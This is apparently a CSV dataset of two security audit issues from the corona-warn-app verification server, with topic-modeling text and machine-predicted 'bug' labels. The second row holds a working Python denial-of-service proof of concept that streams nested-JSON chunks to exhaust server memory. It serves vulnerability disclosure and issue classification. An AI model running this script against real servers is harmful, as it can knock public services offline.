issue_no,repo,issue_url,title,description,patched_file_types,text_for_topic_modeling,prediction,confidence,combined_text
33,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/33,[BSI][0.3.1-alpha] Fields in Request Body not Checked,"Rating: Informational Description: Many of the PostMapping functions do not verify the structure of the request bodies before trying to access fields within the JSON data. In case a specific field is not present, the getter functions return Null which leads to NullPointerExceptions when further processing these values. Proof of Concept: [verification_fields_not_checked.txt](https://github.com/corona-warn-app/cwa-verification-server/files/4671782/verification_fields_not_checked.txt)",source-file | test-file | test-file | config-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | test-file | test-file | config-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | test-file | test-file,bsi alpha fields body checked rating informational description many postmapping functions verify structure bodies trying access fields within json data case specific field present getter functions return null leads nullpointerexceptions processing values proof concept verification fields checked txt https github corona warn app cwa verification server files verification fields checked txt,bug,0.9,"[BSI][0.3.1-alpha] Fields in Request Body not Checked Rating: Informational Description: Many of the PostMapping functions do not verify the structure of the request bodies before trying to access fields within the JSON data. In case a specific field is not present, the getter functions return Null which leads to NullPointerExceptions when further processing these values. Proof of Concept: [verification_fields_not_checked.txt](https://github.com/corona-warn-app/cwa-verification-server/files/4671782/verification_fields_not_checked.txt)"
55,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/55,[BSI][0.3.1-alpha] Missing request size limitation leads to memory exhaustion,"Rating: Medium Description: The server as provided by the Docker file does not limit the request size. This enables an attacker to send arbitrary long requests, that have to be cached by the server in memory. In addition, the server uses stream processing of the supplied JSON data. By repeatedly sending the payload {"""": we can create lots of nested dictionaries, that will be processed by the server. This yields a *10x amplification in memory usage* on the server in comparison to the traffic sent by the attacker. After sending ~164MB, the server CPU usage goes to 100% and the server becomes unresponsive in this configuration. As a single request was used, rate-limiting is not sufficient. Proof of Concept: python import socket, sys if len(sys.argv) != 3: print (""usage %s target [size in MB]"" % sys.argv[0]) sys.exit(-1) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((sys.argv[1], 8080)) hdr = ""POST /version/v1/registrationToken HTTP/1.1\r\n"" hdr += ""Host: ""+sys.argv[1]+"":8080\r\n"" hdr += ""Content-Type: application/json\r\n"" hdr += ""Transfer-Encoding: Chunked\r\n"" hdr += ""\r\n"" s.send(hdr) chunk = '{"""":'*256*1024 # we create lots of nested dicts chunk = ""%x\r\n%s\r\n"" % (len(chunk), chunk) for i in range(int(sys.argv[2])-1): s.send(chunk) sys.stderr.write(""\rSent %d MB"" % i) print(""\nDone"") #raw_input() ",source-file | config-file | source-file | source-file | config-file | test-file | test-file | test-file,bsi alpha missing size limitation leads memory exhaustion rating medium description server provided docker limit size enables attacker send arbitrary long requests cached server memory addition server uses stream processing supplied json data repeatedly sending payload create lots nested dictionaries processed server yields amplification memory usage server comparison traffic sent attacker sending server cpu usage goes server becomes unresponsive configuration single used rate limiting sufficient proof concept python import socket sys len sys argv print usage target size sys argv sys exit socket socket socket inet socket sock stream connect sys argv hdr post registrationtoken http hdr host sys argv hdr content type application json hdr transfer encoding chunked hdr send hdr chunk create lots nested dicts chunk len chunk chunk range int sys argv send chunk sys stderr write rsent print ndone raw input,bug,0.85,"[BSI][0.3.1-alpha] Missing request size limitation leads to memory exhaustion Rating: Medium Description: The server as provided by the Docker file does not limit the request size. This enables an attacker to send arbitrary long requests, that have to be cached by the server in memory. In addition, the server uses stream processing of the supplied JSON data. By repeatedly sending the payload {"""": we can create lots of nested dictionaries, that will be processed by the server. This yields a *10x amplification in memory usage* on the server in comparison to the traffic sent by the attacker. After sending ~164MB, the server CPU usage goes to 100% and the server becomes unresponsive in this configuration. As a single request was used, rate-limiting is not sufficient. Proof of Concept: python import socket, sys if len(sys.argv) != 3: print (""usage %s target [size in MB]"" % sys.argv[0]) sys.exit(-1) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((sys.argv[1], 8080)) hdr = ""POST /version/v1/registrationToken HTTP/1.1\r\n"" hdr += ""Host: ""+sys.argv[1]+"":8080\r\n"" hdr += ""Content-Type: application/json\r\n"" hdr += ""Transfer-Encoding: Chunked\r\n"" hdr += ""\r\n"" s.send(hdr) chunk = '{"""":'*256*1024 # we create lots of nested dicts chunk = ""%x\r\n%s\r\n"" % (len(chunk), chunk) for i in range(int(sys.argv[2])-1): s.send(chunk) sys.stderr.write(""\rSent %d MB"" % i) print(""\nDone"") #raw_input() "
